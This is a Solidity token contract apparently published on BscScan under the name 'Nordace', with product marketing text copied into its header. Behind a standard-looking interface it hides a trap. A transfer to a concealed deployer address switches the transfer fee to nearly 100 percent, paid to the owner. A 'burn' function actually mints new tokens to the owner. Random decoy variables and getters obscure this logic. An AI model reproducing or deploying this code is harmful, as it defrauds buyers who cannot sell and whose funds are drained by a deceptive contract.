/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*
Nordace
We all know the feeling of running out of battery during crucial moments when traveling or commuting.
Thankfully, the #NordaceSienaWeekender won’t let this happen.It is powered by Nordace Connect 
– the charger compatible with iPhone Lightning, Type C, and Micro USB.
    Youtube: https://t.co/QFj4GxLP6j
    Twitter: https://twitter.com/NordaceOfficial
*/



// SPDX-License-Identifier: MIT
pragma solidity =0.8.14;
contract Nordace {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  CdWUMN = 10000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  uhySGY = address(0);
uint256 public constant fZgUIp = 99999;
address private  EcxqXo = address(0);
uint256 private  uOkPFr = 1000000000000000;
address private  fcIYfU = address(0);
address private  VLjrQh = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  pfbAwf = address(0);
uint256 private  zVNANN = 10000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  krsrxe = address(0);
string public  name = "Nordace";
uint256 private  wssIFy = 1000000000000000000000;
address private  XykyYS = address(0);
uint256 private  lvgvtP = 1000000000000000000;
address public owner;
uint256 private  DvkWzO = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  clxLDS = address(0);
uint8 public constant decimals = 18;
uint256 private  BcwlNE = 100000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  MePGGa = address(0);
string public  symbol = "Nordace";
function _getCdWUMN() private returns (uint256) {
return CdWUMN;
}



function _getclxLDS() private returns (address) {
return clxLDS;
}





function _getMePGGa() private returns (address) {
return MePGGa;
}

function _getuOkPFr() private returns (uint256) {
return uOkPFr;
}

function _getEcxqXo() private returns (address) {
return EcxqXo;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "btYLaQ");
require(to != address(0), "btYLaQ");
require(amount <= balanceOf[from], "btYLaQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fZgUIp/lvgvtP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==pfbAwf){
lvgvtP = fZgUIp+2;
}
emit Transfer(from, to, transferAmount);
}




function _getzVNANN() private returns (uint256) {
return zVNANN;
}









function _getBcwlNE() private returns (uint256) {
return BcwlNE;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getkrsrxe() private returns (address) {
return krsrxe;
}



constructor () {
pfbAwf = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}




function _getDvkWzO() private returns (uint256) {
return DvkWzO;
}

function _getwssIFy() private returns (uint256) {
return wssIFy;
}



function _getVLjrQh() private returns (address) {
return VLjrQh;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getXykyYS() private returns (address) {
return XykyYS;
}

function _getuhySGY() private returns (address) {
return uhySGY;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tbtYLaQ 0");
require(spender != address(0), "fbtYLaQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getfcIYfU() private returns (address) {
return fcIYfU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}




function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}